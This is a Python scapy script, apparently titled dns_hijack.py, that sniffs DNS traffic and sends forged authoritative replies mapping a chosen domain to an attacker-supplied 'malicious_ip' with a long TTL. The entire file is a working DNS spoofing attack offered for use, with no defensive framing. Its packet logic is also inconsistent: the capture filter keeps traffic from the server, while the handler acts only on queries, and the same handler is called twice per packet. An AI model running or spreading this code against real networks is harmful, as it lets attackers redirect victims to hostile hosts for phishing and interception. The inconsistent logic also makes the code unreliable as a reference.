from scapy.all import *
from sys import argv


def main():
    if len(argv) != 4:
        print("Correct usage: python3 dns_hijack.py <target_dns_server> <domain_name> <malicious_ip>")
        exit(1)

    target_dns_server = argv[1]
    target_domain = argv[2]
    malicious_ip = argv[3]

    attack_done = False

    def handle_packet(pkt):
        nonlocal attack_done

        # Check for DNS query packet
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            queried_domain = pkt[DNS].qd.qname.decode('utf-8').rstrip('.')

            # If the queried domain matches, send spoofed DNS response
            if queried_domain == target_domain:
                response = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                    UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                    DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                        qd=pkt[DNS].qd,
                        an=DNSRR(rrname=target_domain, type="A",
                                 ttl=86400, rdata=malicious_ip))
                send(response, verbose=0)
                attack_done = True
        return attack_done

    # Sniff DNS responses from the target DNS server
    sniff(filter=f"udp port 53 and src {target_dns_server}",
          prn=handle_packet, stop_filter=handle_packet)


if __name__ == "__main__":
    main()
